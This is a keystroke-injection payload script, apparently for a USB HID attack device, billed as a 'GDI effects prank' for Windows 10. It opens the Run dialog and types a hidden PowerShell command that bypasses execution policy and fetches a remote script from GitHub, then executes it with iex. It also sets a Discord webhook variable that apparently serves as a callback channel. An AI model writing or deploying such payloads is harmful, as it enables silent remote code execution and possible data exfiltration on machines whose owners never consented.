// Title: beigeworm's GDI Effects Prank.
// Author: @beigeworm
// Description: This script uses GDI effects on the users display to create visual effects for 90 seconds.
// Target: Windows 10

// script setup
layout("us")

// Open Powershell and download script
delay(1000);
press("GUI r");
delay(1000);
type("powershell -NoP -Ep Bypass -W H -C $dc='DISCORD_WEBHOOK_HERE'; irm https://raw.githubusercontent.com/beigeworm/PwnPi-Scripts/main/Fast-Execution/Computer-Acid/main.ps1 | iex");
delay(500);
press("ENTER");

